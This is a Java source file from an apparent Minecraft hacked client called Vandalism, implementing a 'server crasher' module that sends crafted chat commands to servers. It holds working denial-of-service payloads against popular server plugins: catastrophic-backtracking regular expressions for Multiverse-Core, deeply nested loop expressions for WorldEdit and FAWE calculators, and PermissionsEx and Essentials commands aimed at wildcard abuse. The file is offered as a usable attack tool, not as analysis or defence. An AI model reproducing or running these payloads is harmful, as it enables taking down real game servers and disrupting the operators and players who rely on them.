/*
 * This file is part of Vandalism - https://github.com/NekosAreKawaii/Vandalism
 * Copyright (C) 2023-2024 NekosAreKawaii, FooFieOwO, Recyz and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package de.nekosarekawaii.vandalism.feature.module.impl.exploit.servercrasher.impl.multi;

import de.nekosarekawaii.vandalism.base.value.impl.selection.EnumModeValue;
import de.nekosarekawaii.vandalism.feature.module.impl.exploit.servercrasher.ServerCrasherModule;
import de.nekosarekawaii.vandalism.feature.module.template.module.MultiExecutionModuleMode;
import de.nekosarekawaii.vandalism.util.StringUtils;
import de.nekosarekawaii.vandalism.util.interfaces.IName;

public class CommandModuleMode extends MultiExecutionModuleMode<ServerCrasherModule> {

    private final EnumModeValue<Command> command = new EnumModeValue<>(
            this,
            "Command",
            "The command to send.",
            Command.MULTIVERSE_CORE,
            Command.values()
    );

    private enum Command implements IName {

        MULTIVERSE_CORE,
        MULTIVERSE_CORE_2,
        FAWE,
        FAWE_2,
        WORLD_EDIT,
        WORLD_EDIT_2,
        PERMISSIONS_EX,
        PERMISSIONS_EX_2,
        PERMISSIONS_EX_3,
        ESSENTIALS;

        private final String name;

        Command() {
            this.name = StringUtils.normalizeEnumName(this.name());
        }

        @Override
        public String getName() {
            return this.name;
        }

    }

    public CommandModuleMode(final ServerCrasherModule parent) {
        super("Command", parent);
    }

    @Override
    protected void onExecute() {
        String command = "";
        switch (this.command.getValue()) {
            case MULTIVERSE_CORE -> command = "mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^";
            case MULTIVERSE_CORE_2 -> command = "mvhelp ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^";
            case FAWE -> command = "to for(i=0;i<256;i++){for(b=0;b<256;b++){for(h=0;h<256;h++){for(n=0;n<256;n++){ln(pi)}}}}";
            case FAWE_2 -> command = "to for(i=0;i<256;i++){for(b=0;b<256;b++){for(h=0;h<256;h++){for(n=0;n<256;n++){}}}}";
            case WORLD_EDIT -> command = "/calc for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){for(m=0;m<256;m++){ln(pi)}}}}}";
            case WORLD_EDIT_2 -> command = "/calc for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<1;l++){ln(pi)}}}}";
            case PERMISSIONS_EX -> command = "pex promote a a";
            case PERMISSIONS_EX_2 -> command = "pex demote a a";
            case PERMISSIONS_EX_3 -> command = "promote * a";
            case ESSENTIALS -> command = "pay * a a";
            default -> {}
        }
        if (command.isBlank()) {
            return;
        }
        mc.getNetworkHandler().sendChatCommand("/" + command);
    }

}
